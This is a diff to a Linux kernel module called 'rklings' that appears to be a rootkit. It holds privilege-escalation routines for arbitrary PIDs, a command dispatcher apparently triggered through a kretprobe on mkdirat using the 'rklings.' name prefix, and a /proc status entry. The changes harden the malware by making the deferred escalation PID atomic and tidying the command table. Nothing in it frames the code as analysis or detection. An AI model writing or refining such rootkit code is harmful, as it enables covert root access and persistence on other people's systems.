@@ -14,6 +14,7 @@
 #include <linux/seq_file.h>
 #include <linux/string.h>
 #include <linux/types.h>
+#include <linux/atomic.h>
 #include <linux/uaccess.h>
 
 #define RK_PREFIX     "rklings."
@@ -21,7 +22,7 @@
 #define RK_PATH_MAX   128
 
 static unsigned int escalation_count;
-static int deferred_pid;
+static atomic_t deferred_pid = ATOMIC_INIT(0);
 
 static int rk_escalate(void)
 {
@@ -66,13 +67,14 @@ static int rk_escalate_pid(int pid)
 
 static int rk_try_deferred(void)
 {
+	int pid = atomic_read(&deferred_pid);
 	int ret;
 
-	if (deferred_pid <= 0)
+	if (pid <= 0)
 		return 0;
-	ret = rk_escalate_pid(deferred_pid);
+	ret = rk_escalate_pid(pid);
 	if (ret == 0)
-		deferred_pid = 0;
+		atomic_set(&deferred_pid, 0);
 	return ret;
 }
 
@@ -85,7 +87,7 @@ static int rk_cmd_ping(const char *arg)
 static int rk_cmd_status(const char *arg)
 {
 	pr_info("rklings: alive, escalations=%u, deferred=%d\n",
-		escalation_count, deferred_pid);
+		escalation_count, atomic_read(&deferred_pid));
 	return 0;
 }
 
@@ -102,15 +104,17 @@ static int rk_cmd_escalate(const char *arg)
 
 	ret = rk_escalate_pid(pid);
 	if (ret == -ESRCH) {
-		deferred_pid = pid;
+		atomic_set(&deferred_pid, pid);
 		return 0;
 	}
 	return ret;
 }
 
+typedef int (*rk_handler_t)(const char *arg);
+
 struct rk_cmd_entry {
-	const char *name;
-	int (*handler)(const char *arg);
+	const char *key;
+	rk_handler_t handler;
 };
 
 static const struct rk_cmd_entry cmd_table[] = {
@@ -139,10 +143,10 @@ static int rk_dispatch(const char *name)
 	}
 
 	for (i = 0; i < ARRAY_SIZE(cmd_table); i++) {
-		int nlen = strlen(cmd_table[i].name);
+		int klen = strlen(cmd_table[i].key);
 
-		if (cmd_len == nlen &&
-		    strncmp(suffix, cmd_table[i].name, nlen) == 0)
+		if (cmd_len == klen &&
+		    strncmp(suffix, cmd_table[i].key, klen) == 0)
 			return cmd_table[i].handler(arg);
 	}
 
@@ -234,9 +238,12 @@ static struct kretprobe rk_mkdirat_probe = {
 
 static int rk_proc_show(struct seq_file *m, void *v)
 {
+	int dpid;
+
 	rk_try_deferred();
-	if (deferred_pid > 0)
-		seq_printf(m, "deferred: %d\n", deferred_pid);
+	dpid = atomic_read(&deferred_pid);
+	if (dpid > 0)
+		seq_printf(m, "deferred: %d\n", dpid);
 	else
 		seq_puts(m, "idle\n");
 	seq_printf(m, "escalations: %u\n", escalation_count);
